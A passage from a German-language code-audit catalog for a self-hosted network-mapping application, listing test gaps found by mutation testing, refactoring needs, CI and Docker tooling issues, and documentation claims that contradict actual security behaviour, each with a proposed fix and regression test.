- **Ort:** `app/static/vendor/cytoscape.min.js:1-3`, `THIRD_PARTY.md:9`, `.github/dependabot.yml`, `package.json`
- **Was passiert:** Weder Dependabot noch der SBOM-Lauf noch `npm audit` sehen die Datei. Ein bekanntes CVE ist nicht benannt, die Bibliothek zeichnet nur eigene Daten.
- **Fix:** Cytoscape in `package.json` führen und `dist/cytoscape.min.js` per Skript mit Hash-Prüfung kopieren. Changelog 3.31 bis 3.35 lesen, dann aktualisieren und `ui_dom_check` mit der neuen Version laufen lassen.
- **Regressionstest:** `tests/ui/vendor_version.mjs::vendored_cytoscape_matches_package_json`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab.

### 7.6 Tests

Lücken der Testsuite, belegt durch überlebende Mutanten.

#### Schreib-Routen unter den Token-Pfaden sind nur durch `Depends(require_auth)` geschützt, und kein Test hält das fest (T-1)

- **Schwere:** hoch · **Status:** bestätigt, nachgestellt · **Welle:** W2
- **Ort:** `app/web.py:22`, `app/web.py:45-52`, `app/api.py:214`, `app/api.py:241`, `tests/test_bulk_connect.py:99`, `tests/test_delete_device.py:42-52`
- **Was passiert:** Die Middleware lässt jede Anfrage unter `/api/devices`, `/api/device/` und `/api/export/` mit beliebigem `?token=` durch, diese Liste heißt `TOKEN_PATHS`. Ohne `Depends(require_auth)`, die Anmeldeprüfung je Route, an `PATCH /api/device` und `POST /api/devices/connect` bleiben 230 Tests grün, eine Probe schreibt „pwned“. Heute nur eine Testlücke.
- **Fix:** Parametrisierter Test über jede Schreibroute unter den Token-Pfaden, mit `?token=junk` und mit gültigem Lese-Token, erwartet 401 oder 403. Dazu ein Routen-Durchlauf, der prüft, dass jede nicht-GET-Route eine Sitzung verlangt.
- **Regressionstest:** `tests/test_token_routes.py::test_write_routes_reject_junk_and_readonly_token`
- **Hinweis:** Mutanten B2 und B3. Riskant ist erst die Kombination aus einem Refactoring und dem fehlenden Test.

#### `run_once` und die Hauptschleife des Scanners werden von keinem Test ausgeführt (T-2)

- **Schwere:** hoch · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/scanner/run.py:429-498`, `tests/test_scanner.py`
- **Was passiert:** Die Abdeckung dort ist 0 Prozent. Das Zurücksetzen von Fix 8359c3d, bei dem der Scanner den zyklischen Scan nie ausführte, lässt 230 Tests bestehen, ebenso die Mutanten F4 bis F7.
- **Fix:** `run_once` mit gepatchten `collect_devices` und `notify_new_devices` testen: Aufruf nur für Nicht-VPN und Nicht-Whitelist, `scanning=0` nach einer Ausnahme. Die Schleife `main()` mit gepatchtem `time.sleep`, das nach N Durchläufen wirft.
- **Regressionstest:** `tests/test_scanner_loop.py::test_run_once_notifies_only_new_non_vpn_devices`, `tests/test_scanner_loop.py::test_run_once_resets_scanning_after_exception`, `tests/test_scanner_loop.py::test_main_loop_calls_run_once`
- **Hinweis:** Die Zeilenbereiche des Finders sind um etwa 1 versetzt, `run_once` beginnt bei 429.

#### Die Retention-Tests prüfen die Grenzen nicht, zu viel Löschen bleibt unentdeckt (T-3)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `tests/test_scanner.py:64-85`, `tests/test_security_v160.py:40`, `app/scanner/run.py:416`
- **Was passiert:** Mutant R1, der den Statusfilter `offline` weglässt, und Mutant R2, der Tage zu Stunden macht, überleben bei 230 bestandenen Tests. Die Tests nutzen nur ein Gerät von 2020.
- **Fix:** Grenzfälle prüfen: offline seit 29 Tagen bleibt, 31 Tage geht, alt aber online bleibt, ein Ereignis von 29 Tagen bleibt.
- **Regressionstest:** `tests/test_retention.py::test_retention_boundaries_offline_29_kept_31_removed`, `tests/test_retention.py::test_old_online_device_is_kept`

#### Der Auto-Export, der Dateien schreibt, hat keinen Test (T-6)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W4
- **Ort:** `app/exporters.py:112-128`
- **Was passiert:** Nur `auto_export_due` ist getestet. Mutant R3, der `auto_export` vorher `[]` liefern lässt, überlebt, die Zeilen 113 bis 128 sind ungetestet.
- **Fix:** `auto_export` mit `tmp_path` laufen lassen und Dateien, Inhalt, Namensmuster sowie die Beschränkung auf das Datenverzeichnis prüfen.
- **Regressionstest:** `tests/test_auto_export.py::test_auto_export_writes_files_inside_data_dir`

#### Das Ablaufen einer Sitzung in `is_valid_session` ist nicht getestet (T-4)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W6
- **Ort:** `app/auth.py:115-122`, `tests/test_hardening.py:56-65`
- **Was passiert:** Nur `prune_sessions` wird geprüft. Mutant M10, der `entry[1] > now` entfernt, überlebt, abgelaufene 12-Stunden-Sitzungen blieben gültig, wenn das Aufräumen versagt.
- **Fix:** `SESSIONS[tok] = ("admin", time.time() - 1)` setzen und `/api/me` ohne Prune auf 401 prüfen.
- **Regressionstest:** `tests/test_session_expiry.py::test_expired_session_rejected_without_prune`

#### Mehrere Fix-Commits haben keinen Test, der beim Zurücksetzen fehlschlägt (T-16)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W6
- **Ort:** `git log (8359c3d, f631a25, b454ca8, e885216, 3846cc9, 40f10cb)`
- **Was passiert:** Das Zurücksetzen von 8359c3d lässt die Suite grün. 8359c3d, f631a25 und b454ca8 berühren keine Testdatei, 40f10cb brachte keinen Test mit, und der jsdom-Mock liefert immer `scanning: 0`. Die anderen zehn Fixes haben Tests.
- **Fix:** Je ein Test für die Scan-Anzeige mit jsdom und `scanning: 1`, für die TCP-Probe gegen einen lokalen Socket, für die PDF-Überlappung und für `[hidden]`-CSS. Die Schleife deckt T-2 ab.
- **Regressionstest:** `tests/ui/scan_indicator.mjs::indicator_shows_while_scanning`, `tests/test_network_paths.py::test_tcp_probe_sweep_against_local_socket`
- **Hinweis:** Alle 14 Hashes existieren, geprüft vom Prüfer.

#### Es gibt keinen End-to-End-Test vom Scanner bis zur API in pytest (T-7)

- **Schwere:** mittel · **Status:** plausibel · **Welle:** W6
- **Ort:** `tests/`, `.github/workflows/ci.yml:49-125`
- **Was passiert:** Web und Scanner laufen nie zusammen, der Weg Scanner, Datenbank, API ist nur stückweise abgedeckt. Der Docker-Job in CI prüft nur per curl und läuft nicht lokal.
- **Fix:** Ein Test: `collect_devices` gepatcht, `run_once`, dann `TestClient` auf `GET /api/devices` und Export. Folgt aus T-2, weil `run_once` nie läuft.
- **Regressionstest:** `tests/test_e2e_scan_api.py::test_scan_result_visible_via_api`

#### Die Scanner-Tests ersetzen Netzwerk und Unterprozesse fast überall durch Fakes (T-9)

- **Schwere:** mittel · **Status:** plausibel · **Welle:** W6
- **Ort:** `tests/test_scanner.py`, `app/scanner/ports.py:17-35`, `app/scanner/snmp.py:13-53`, `app/scanner/names.py:103-137`, `app/scanner/mdns.py:109-134`, `app/scanner/discover.py:190-247`
- **Was passiert:** `ports.py` hat 44 Prozent, `snmp.py` 48 Prozent Abdeckung. Echte Sockets und Aufrufe von `ip neigh`, `arp -an` und `ping` laufen nie, auch Fix e885216 am TCP-Sweep ist in jedem Test ersetzt. Es sind 58 `monkeypatch`-Stellen, nicht 59.
- **Fix:** `tcp_probe_sweep` und `scan_ports` gegen einen lokalen Socket auf 127.0.0.1 testen, aufgezeichnete Ausgaben von `ip neigh`, `arp -an` und `ping` als Fixtures. Wie weit das lohnt, ist Ermessen.
- **Regressionstest:** `tests/test_network_paths.py::test_scan_ports_finds_local_listener`

#### Datenbankmigrationen sind nur für drei Spalten aus einem handgeschriebenen Mini-Schema getestet (T-10)

- **Schwere:** mittel · **Status:** plausibel · **Welle:** W3
- **Ort:** `tests/test_db.py:129-190`, `app/db.py:160-210`, `app/db.py:195`
- **Was passiert:** Für `ip6`, `link_port`, `category_reason` und die Token-Umstellung `_migrate_tokens` von Klartext auf sha256 gibt es keinen Test aus einem alten Schema. Eine fehlerhafte Token-Migration sperrt Embed-Nutzer aus. Nicht ausgeführt.
- **Fix:** Datenbanken oder SQL-Dumps früherer Versionen von v1.0 bis v1.6.x als Fixture, ein Upgrade-Test, dass Daten und Token gültig bleiben und ein zweites `init_db` nichts ändert.
- **Regressionstest:** `tests/test_migrations.py::test_upgrade_from_v1_0_fixture_keeps_rows_and_tokens`
- **Hinweis:** In W3 umgesetzt, weil W3 die Migration ohnehin ändert, siehe K-4.

#### Parser für Daten aus dem LAN haben keine Property- oder Fuzz-Tests (T-11)

- **Schwere:** mittel · **Status:** plausibel · **Welle:** W6
- **Ort:** `app/scanner/mdns.py`, `app/scanner/tr064.py`, `app/scanner/discover.py`, `app/api.py`
- **Was passiert:** DNS-Pakete und SOAP/XML kommen aus dem LAN, geprüft sind nur handverlesene Fälle. `hypothesis` steht nicht in `requirements-dev.in`.
- **Fix:** hypothesis-Tests: `parse_packet(random bytes)` wirft nie und hängt nie, `_parse_fields` wirft bei kaputtem XML nur `TR064Error`, `normalize_mac` ist idempotent. W0 nimmt `hypothesis` ins Dev-Set auf.
- **Regressionstest:** `tests/test_parsers_property.py::test_parse_packet_never_raises`

#### Kleine Testschwächen: Quelltext-Vergleiche, feste Wartezeit im jsdom-Test und globaler Zustand zwischen Tests (T-8, T-14, T-15)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W6
- **Ort:** `tests/test_a11y_css.py:41`, `tests/test_hardening.py:19`, `tests/test_hardening.py:151`, `tests/test_security_v160.py:48`, `tests/test_security_v160.py:155`, `tests/ui_dom_check.mjs:198`, `tests/conftest.py`
- **Was passiert:** Einzelne Tests prüfen Literale im Quelltext oder Konstanten. `ui_dom_check.mjs:198` wartet fest 200 ms, `check_web(1)` verlässt sich auf einen geschlossenen Port 1, und `auth.SESSIONS` samt Drossel werden von Fixtures nicht zurückgesetzt.
- **Fix:** Die Literal-Tests als billige Wächter kennzeichnen. Im jsdom-Test auf eine Bereitschaftsbedingung warten statt fest zu schlafen, ein `autouse`-Fixture leert `auth.SESSIONS`, `check_web` nutzt einen frei gewählten geschlossenen Port.
- **Regressionstest:** `tests/test_session_expiry.py::test_sessions_isolated_between_tests`
- **Hinweis:** Zeilenangaben des Finders sind um 1 bis 2 versetzt.

#### Es gibt keinen Lasttest für 200 Geräte und keinen Schematest der API-Antworten (T-12, T-13)

- **Schwere:** niedrig · **Status:** plausibel · **Welle:** W6
- **Ort:** `CHANGELOG.md:24`, `CHANGELOG.md:30`, `tests/test_api.py`, `tests/ui_dom_check.mjs:30`
- **Was passiert:** Die Zusage „Performance ab ungefähr 200 Geräten“ ist nicht geprüft. Feldnamen der Antworten sind nur zufällig getestet, die jsdom-Fixture `DEVS` ist handgeschrieben und kann abweichen. Nicht vertieft geprüft.
- **Fix:** pytest mit 500 Geräten und großzügigen Zeitgrenzen. Die Schlüsselmenge von `/api/devices`, `/api/meta` und `/api/settings` als Snapshot festhalten und die jsdom-Fixture aus der echten API erzeugen.
- **Regressionstest:** `tests/test_api_contract.py::test_devices_response_keys_snapshot`, `tests/test_load.py::test_500_devices_list_under_budget`

**Mutations-Kill-Liste.** Die Prüfung hat 46 Mutanten angewandt, 13 von 13 Behauptungen des Finders ließen sich reproduzieren. Diese Überlebenden müssen nach den genannten Wellen sterben, W6 prüft das mit `scripts/mutants.sh`:

| Mutant      | Bedeutung                                                                                     | Getötet durch | Welle |
| ----------- | --------------------------------------------------------------------------------------------- | ------------- | ----- |
| B2, B3      | `Depends(require_auth)` entfernt an `POST /api/devices/connect` und `PATCH /api/device/{mac}` | T-1           | W2    |
| M11         | Subnetz-Scope des Embed-Tokens ignoriert                                                      | S-1 mit T-5   | W2    |
| R1          | Aufbewahrung löscht auch Online-Geräte (Statusfilter weg)                                     | T-3           | W4    |
| R2          | Aufbewahrung rechnet Stunden statt Tage                                                       | T-3           | W4    |
| R3          | `auto_export` schreibt nichts                                                                 | T-6           | W4    |
| F4          | `run_once` ruft nie Notify auf                                                                | T-2           | W4    |
| F5          | `run_once` setzt `scanning` nie zurück                                                        | T-2           | W4    |
| F6          | VPN-Geräte lösen den Neu-Gerät-Alarm aus                                                      | T-2           | W4    |
| F7, 8359c3d | `main()` ruft `run_once` nie auf                                                              | T-2           | W4    |
| M10         | Sitzungsablauf in `is_valid_session` ignoriert                                                | T-4           | W6    |

Äquivalente Mutanten ohne Handlungsbedarf: M4, M18, R8 bis R11 und M19. M19 ist in der Tabelle des Finders irrtümlich als Überlebender markiert, die Middleware sperrt `/api/logs` weiter.

### 7.7 Struktur und Typen

Große Funktionen, Schichtung, Typisierung.

#### `collect_devices` hat 125 Anweisungen und Komplexität 40, und der Scanner schreibt selbst in die Datenbank (Q-3)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/scanner/run.py:206-400`, `app/scanner/run.py:72`, `app/scanner/run.py:89`
- **Was passiert:** Erkennung, TR-064, SNMP, mDNS, Namen, Kategorien, VPN-Markierung und Mesh-Zusammenführung stehen in einer Funktion und sind einzeln nicht prüfbar. `add_source` parst bei jedem Aufruf einen kommagetrennten String.
- **Fix:** Eine Pipeline aus reinen Stufen in `app/scanner/pipeline.py`: sammeln, zusammenführen, anreichern, speichern, mit einer `Device`-Struktur statt loser Dicts. Vor dem Umbau die Ausgabe von `collect_devices` festhalten, damit das Verhalten identisch bleibt. Die Aufteilung ist Ermessen.
- **Regressionstest:** `tests/test_pipeline.py::test_collect_devices_output_unchanged`

#### SQL und Fachlogik stecken in den Routen von `api.py` (Q-4)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/api.py:112`, `app/api.py:145`, `app/api.py:177`, `app/api.py:192-195`, `app/api.py:220-250`
- **Was passiert:** `api.py` hat 11 `conn.execute`, obwohl `db.py` mit 533 Zeilen für Persistenz da ist. Die Zyklenprüfung `_check_parent` und die Token-Filter sind Geschäftsregeln im HTTP-Modul, `api.py` hat 584 Zeilen.
- **Fix:** Helfer `db.device_exists`, `list_rooms`, `update_device_meta`, `reset_layout`, `parent_chain` einführen, `_check_parent` in ein Servicemodul legen, Router je Bereich für Geräte, Einstellungen, Tokens, Export und Meta. Die Routenregistrierung in `web.py` trägt der Orchestrator ein.
- **Regressionstest:** `tests/test_routes_inventory.py::test_route_table_unchanged`

#### Parser und Klassifikator sind zu komplex (Q-14)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/scanner/categorize.py:138`, `app/scanner/tr064.py:197`, `app/scanner/discover.py:221`, `app/scanner/discover.py:122`, `app/scanner/mdns.py:54`, `app/api.py:283`
- **Was passiert:** `classify` hat Komplexität 24, `parse_mesh` 21 mit 57 Anweisungen, `discover` 20 mit 55. Die Regelreihenfolge in `classify` ist schwer zu testen.
- **Fix:** `classify` als geordnete Regeltabelle mit Name, Prädikat, Kategorie und Grund, wobei der erste Treffer gewinnt und Gründe wie `host:iphone` bleiben. `parse_mesh` in `parse_nodes`, `parse_links`, `resolve_attachment` teilen, `discover` in eine Funktion je Sonde. Die Aufteilung ist Ermessen.
- **Regressionstest:** `tests/test_categorize.py::test_rule_order_unchanged`

#### Typ-Artefakte und 159 Fehler unter `mypy --strict`, aber kein Laufzeitfehler (TL-5)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/scanner/topology.py:82`, `app/scanner/names.py:29-30`, `app/scanner/run.py:58`, `app/scanner/run.py:114`, `app/scanner/categorize.py:173`, `app/scanner/tr064.py:279`
- **Was passiert:** mypy meldet 9 Fehler im Standardmodus und 159 im Strict-Modus, davon 89 fehlende Annotationen und 55 nackte `dict` oder `list`. Jede gelesene Meldung ist durch eine vorherige Prüfung abgesichert. Werkzeuglauf des Finders.
- **Fix:** Modulweise `disallow_untyped_defs`, beginnend mit `db.py` und `api.py`, `class DeviceRow(TypedDict)` für die 74 `dict`-Stellen, `response_model=` für Geräte, Einstellungen, Tokens und Meta. `OVERRIDABLE` entfällt mit Q-1. Ziel `mypy --strict app`.
- **Regressionstest:** entfällt, kein Verhalten, Gate-Schritt `uv run mypy --strict app` ist grün

#### Die Route `/api/rooms` wird von der Oberfläche nicht genutzt, und Altschlüssel halten zwei Konfigurationspfade (Q-12)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/api.py`, `app/config.py:70`
- **Was passiert:** Von 23 Routen hat nur `/api/rooms` keinen Bezug in `app/static`. `/api/health` dient dem Healthcheck. `subnet` neben `subnets` und `fritz_url` neben `fritz_urls` halten zwei Pfade.
- **Fix:** `/api/rooms` löschen oder für die Raumliste im Frontend nutzen. Die Altschlüssel erst mit Migration in einer größeren Version entfernen.
- **Regressionstest:** `tests/test_routes_inventory.py::test_no_unreferenced_routes`

#### Doppelte Konfigurationspfade und Alias-Einstellungen ließen sich löschen (Q-16)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/config.py`, `app/scanner/run.py:18-50`, `app/api.py:384`
- **Was passiert:** Altaliase `subnet` und `subnets`, `fritz_url` und `fritz_urls`, und ein per Oberfläche gespeichertes `fritz_pass` neben der Umgebungsvariable. Die fünf Bool-Lambdas entfallen mit Q-1.
- **Fix:** Aliase mit Migration entfernen und eine Wahrheitsquelle festlegen: Umgebung als Start, Datenbank als Laufzeitüberschreibung, dokumentiert.
- **Regressionstest:** `tests/test_settings_schema.py::test_legacy_alias_migrated`

#### Namen und Sprache sind gemischt, und Kategorien werden als deutsche Anzeigetexte gespeichert (Q-13)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W7
- **Ort:** `app/scanner/categorize.py:14-23`
- **Was passiert:** Kategorien wie „Drucker“ und „Mobilgerät“ sind gespeicherte Schlüssel, eine Übersetzung oder Umbenennung verlangt eine Datenmigration. Logger heißen `netmap.*` und `fox_netmap`, das Präfix ist `NETZ_`. Dass Benennung Geschmack ist, hat der Prüfer nicht verifiziert.
- **Fix:** Vor Beginn entscheiden. Empfehlung: in dieser Kampagne nur dokumentieren. Sprachneutrale Kategorie-IDs mit Übersetzungsetiketten brauchen eine Datenmigration und Änderungen an der Oberfläche und sind eine eigene Kampagne.
- **Regressionstest:** entfällt, Entscheidung ohne Verhalten
- **Hinweis:** Nur Fakten bestätigt, Bewertung ist Ermessen.

### 7.8 Werkzeuge und Abhängigkeiten

Format, Lint, Typen, CI, Version, Container, Abhängigkeiten.

#### Die Version steht an drei Stellen im Code, und die README nennt 1.6.4 statt 1.6.16 (Q-5)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `app/__init__.py:1`, `pyproject.toml:3`, `app/config.py:66`, `README.en.md:53`, `.github/workflows/release.yml`
- **Was passiert:** Der Release-Check vergleicht nur Tag und `__version__`. Als pydantic-Feld lässt sich `app_version` per `NETZ_APP_VERSION` überschreiben und meldet dann eine falsche Version.
- **Fix:** Einzige Quelle `app.__version__` mit `[tool.hatch.version]`, `config.py` ohne eigenes Feld. Die README-Versionsangaben ersetzt W8 durch Platzhalter, siehe D-1.
- **Regressionstest:** `tests/test_version.py::test_version_has_single_source`

#### `pyproject.toml` ist keine echte Projektdefinition (Q-6)

- **Schwere:** mittel · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `pyproject.toml`
- **Was passiert:** Es gibt keine Abhängigkeiten, kein Build-System, keinen Einstiegspunkt, die Beschreibung ist deutsch. Ruff wählt nur `E4,E7,E9,F,I`, es gibt keinen Typprüfer und kein Coverage-Werkzeug.
- **Fix:** Mit uv: `dependencies`, `dependency-groups`, `[project.scripts]`, hatchling, erweiterte ruff-Regeln. Einzelheiten stehen in Abschnitt 8 unter "Welle 0 im Detail".
- **Regressionstest:** entfällt, Werkzeugänderung, Gate-Schritt `uv sync --frozen`

#### CI prüft weder Format noch Typen noch Abdeckung noch JS-Lint, und 19 Dateien sind nicht formatiert (TL-6, Q-15, D-9)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `.github/workflows/ci.yml`, `.github/workflows/release.yml`, `.github/workflows/main-scan.yml`, `pyproject.toml`
- **Was passiert:** `ruff format --check` schlägt bei 19 Dateien an. Es laufen kein Typprüfer, keine Abdeckung, nur Python 3.12 und kein JS-Lint, `node --check` aus CONTRIBUTING wird nicht ausgeführt. `main-scan.yml` hängt nicht von `ci` ab.
- **Fix:** Einmal formatieren und dann `ruff format --check`, `mypy`, eine Abdeckungsschwelle, die Matrix 3.12 und 3.13 und `pip-audit` ins Gate aufnehmen. Jede Stufe hält CI grün.
- **Regressionstest:** entfällt, Werkzeugänderung, `scripts/gate.sh` bricht bei Verstoß ab
- **Hinweis:** Q-15 und D-9 vom Prüfer als niedrig bestätigt, D-9 von mittel herabgestuft. 188 Testfunktionen ergeben 230 Tests.

#### Das Dockerfile führt `apt-get upgrade` aus und ist einstufig, der Entrypoint läuft als root (Q-7)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `Dockerfile:18`, `docker/entrypoint.sh`
- **Was passiert:** `apt-get upgrade -y` macht den Digest-Pin des Basis-Images wertlos, weil jeder Build andere Pakete zieht. Der Entrypoint läuft als root und macht `chown -R` auf `/data`. Die Behauptung, Build-Abhängigkeiten blieben im Image, ist übertrieben, es wird kein Compiler installiert.
- **Fix:** Zweistufig mit dem venv aus `uv sync`, `apt-get upgrade` entfernen, Aktualität über Dependabot-Digest und Trivy. Dokumentieren, warum root im Entrypoint nötig ist.
- **Regressionstest:** entfällt, Werkzeugänderung, Gate-Schritt `docker compose build`
- **Hinweis:** Der Prüfer nennt niedrig bis mittel, hier als niedrig geführt.

#### ESLint und tsc melden Rauschen durch geteilte Globals, aber keine echten Fehler (TL-7)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `app/static/*.js`, `package.json`
- **Was passiert:** 22 `no-undef` kommen von `I18N`, `LANGS`, `iconUri`, `iconKeyFor` und `CATEGORY_ICON_KEYS`, die über mehrere Script-Tags geteilt werden. 140 von 141 tsc-Fehlern sind `getElementById` ohne Cast. Werkzeuglauf des Finders.
- **Fix:** `eslint.config.mjs` mit `sourceType: "script"` und diesen Globals plus `cytoscape`, `no-unused-vars` mit `caughtErrors: "none"`, `npm run lint` in CI. `checkJs` zurückstellen, bis ES-Module existieren. Die Fixes an `app.js` selbst stehen in TL-4.
- **Regressionstest:** entfällt, Werkzeugänderung, Gate-Schritt `npm run lint`
- **Hinweis:** Konfigurationsteil W0, Code-Teil TL-4 in W5.

#### Der Digest des Basis-Images ist veraltet, und nur Python 3.12 wird getestet (D-6)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `Dockerfile:2`, `.github/workflows/ci.yml`, `pyproject.toml:5`, `.github/dependabot.yml`
- **Was passiert:** Gepinnt ist `5e2bdb1b`, aktuell ist `191083cd` für `python:3.12-slim`. Dependabot ignoriert Minor-Wechsel, 3.13 und 3.14 sind ungetestet, 3.12 wird bis Oktober 2028 unterstützt. Digest-Drift zwischen den wöchentlichen Läufen ist normal.
- **Fix:** Den Digest-PR von Dependabot übernehmen, die CI-Matrix um 3.13 erweitern, eine Python-Upgrade-Politik dokumentieren.
- **Regressionstest:** entfällt, Werkzeugänderung, die CI-Matrix ist grün
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab.

#### Dependabot sieht gitleaks, den Trivy-Pin und einen Docker-Cooldown nicht (D-7)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W0
- **Ort:** `.github/workflows/gitleaks.yml:22-25`, `scripts/trivy.sh:15`, `.github/dependabot.yml`
- **Was passiert:** gitleaks 8.24.3 wird per curl geholt, aktuell ist 8.30.1. Trivy 0.76.2 steht hartkodiert, der `docker`-Block hat anders als die übrigen kein `cooldown`. `codeql-action` liegt bei v4.39.4 statt v4.39.5.
- **Fix:** gitleaks als per SHA gepinnte Action oder wöchentlicher Frische-Check, `cooldown` im `docker`-Block, Tabelle „Manuell zu pflegen“ in `CONTRIBUTING.md`.
- **Regressionstest:** entfällt, Werkzeugänderung

### 7.9 Doku

Falsche oder fehlende Dokumentation.

#### Mehrere Aussagen in `docs/03-sicherheit.md` und im Handbuch stimmen nicht mit dem Verhalten überein (N-6)

- **Schwere:** mittel · **Status:** bestätigt, nachgestellt · **Welle:** W8
- **Ort:** `docs/03-sicherheit.md:54-64`, `docs/03-sicherheit.md:113-118`, `docs/03-sicherheit.md:157-165`, `docs/03-sicherheit.md:230-236`, `docs/02-benutzerhandbuch.md:250`, `docs/02-benutzerhandbuch.md:393`, `docs/02-benutzerhandbuch.md:395`
- **Was passiert:** Mindestens acht Aussagen sind falsch oder durch die Befunde dieses Katalogs überholt, Tabelle unter diesem Block. Wer sich auf die Sicherheitsdoku verlässt, schätzt die Lage zu günstig ein.
- **Fix:** Jede Aussage erst nach dem Fix der zugehörigen Welle korrigieren, damit die Doku zum fertigen Stand passt. Nicht behobene Punkte als Restrisiko in Abschnitt 4 aufnehmen.
- **Regressionstest:** `tests/test_docs.py::test_security_doc_names_global_lockout_and_forwarded_for`
- **Hinweis:** Neu aus der Sicherheitsprüfung, die die Aussagen der Doku einzeln gegengeprüft hat.

Falsche oder überholte Aussagen im Einzelnen:

| Stelle                                       | Aussage                                                         | Wirklichkeit                                                                | Befund |
| -------------------------------------------- | --------------------------------------------------------------- | --------------------------------------------------------------------------- | ------ |
| `docs/03-sicherheit.md` 2.8                  | „`GET /api/settings` liefert keine Secrets“                     | Es liefert SNMP-Community, Benachrichtigungs-URLs und URLs mit Benutzerinfo | S-8    |
| `docs/03-sicherheit.md` 2.3                  | „`X-Forwarded-For` wird bewusst nicht ausgewertet“              | uvicorn wertet ihn aus, wenn der Peer 127.0.0.1 ist, also ohne Docker       | S-13   |
| `docs/03-sicherheit.md` 2.3                  | „Bewusst nicht pro Benutzer allein“                             | Hinter einem Proxy gilt faktisch eine globale Sperre                        | S-5    |
| `docs/03-sicherheit.md` 2.8                  | Embed-Tokens sind „filterbar“                                   | `/api/device/{mac}` ignoriert Subnetz und Kategorie des Tokens              | S-1    |
| `docs/03-sicherheit.md` 2.12 und 4           | Token nur als Hash gespeichert, Restrisiko nur über den Referer | Klartext-Token stehen im Zugriffslog                                        | S-12   |
| `docs/03-sicherheit.md` 2.5 und 2.6          | Keine Aussage zu Dateirechten und Klartext-Passwort             | `netmap.db` und `netmap.log` sind 0644, `fritz_pass` liegt im Klartext      | S-17   |
| `docs/03-sicherheit.md` 2                    | Öffentliche Endpunkte nicht beschrieben                         | `/api/meta` liefert WAN-IP, Gateway und Version ohne Login                  | S-10   |
| `docs/02-benutzerhandbuch.md:393`            | „https→http-Fallback automatisch“                               | Der Rückfall ist ein stilles Downgrade und wird entfernt                    | S-2    |
| `docs/02-benutzerhandbuch.md:250` und `:395` | Gleiche IP mit zwei MACs wird beim Start zusammengeführt        | Das löscht echte Geräte samt Notiz und Layout                               | K-3    |

#### Die README in Deutsch und Englisch nennt v1.6.4 und pinnt Beispiele darauf (D-1)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W8
- **Ort:** `README.md:52`, `README.md:63`, `README.md:66`, `README.md:68`, `README.en.md:53`, `README.en.md:64`, `README.en.md:67`, `README.en.md:69`
- **Was passiert:** Die Version ist 1.6.16. Wer das `image:`-Beispiel kopiert, deployt eine zwölf Releases alte Version, das `:latest`-Beispiel ist richtig.
- **Fix:** Platzhalter `<X.Y.Z>` oder `:1.6` einsetzen, die Zeile „Aktuell“ streichen. Die Release-Checkliste prüft per grep auf veraltete Versionen.
- **Regressionstest:** `tests/test_docs.py::test_readme_has_no_stale_version`
- **Hinweis:** Prüfer stufte von mittel auf niedrig herab.

#### Das CHANGELOG hat keinen Abschnitt `[Unreleased]`, obwohl CONTRIBUTING ihn verlangt (D-3)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W8
- **Ort:** `CHANGELOG.md:7`, `CONTRIBUTING.md:21`
- **Was passiert:** Mitwirkende sollen Einträge unter `[Unreleased]` ergänzen, den es nicht gibt. `grep -c Unreleased CHANGELOG.md` liefert 0.
- **Fix:** Abschnitt `## [Unreleased]` anlegen und die Umbenennung beim Release in die Checkliste schreiben. Für diese Kampagne gilt ohnehin, dass Einträge nur dort stehen.
- **Regressionstest:** `tests/test_docs.py::test_changelog_has_unreleased_section`

#### Die Umgebungstabellen in allen sechs Handbüchern sind unvollständig, und `/api/logout` fehlt (D-4)

- **Schwere:** niedrig · **Status:** plausibel · **Welle:** W8
- **Ort:** `docs/02-benutzerhandbuch.md`, `docs/02-benutzerhandbuch.en.md`, `docs/02-benutzerhandbuch.fr.md`, `docs/02-benutzerhandbuch.es.md`, `docs/02-benutzerhandbuch.it.md`, `docs/02-benutzerhandbuch.pt.md`, `docs/01-anforderungen.md`
- **Was passiert:** In allen Sprachen fehlen unter anderem `NETZ_NOTIFY_*`, `NETZ_HOST`, `NETZ_DATA_DIR`, `NETZ_OUI_ONLINE_MAX`, `NETZ_OUI_ONLINE_URL`, `NETZ_AUTO_EXPORT_DIR`, `NETZ_SNMP_COMMUNITY`. `docs/01-anforderungen.md` lässt rund 30 Variablen aus. Vom Prüfer nicht erneut geprüft.
- **Fix:** Eine Referenztabelle aus `app/settings_schema.py` erzeugen und aus README und Handbuch verlinken.
- **Regressionstest:** `tests/test_docs.py::test_env_reference_covers_all_settings`
- **Hinweis:** Abhängig von W1, dem Schema als Quelle.

#### Betriebsdokumente fehlen: Runbook, Architektur, Bedrohungsmodell, Teststrategie, Release-Checkliste (D-10)

- **Schwere:** niedrig · **Status:** bestätigt, aus Code belegt · **Welle:** W8
- **Ort:** `docs/`, `app/web.py:30`
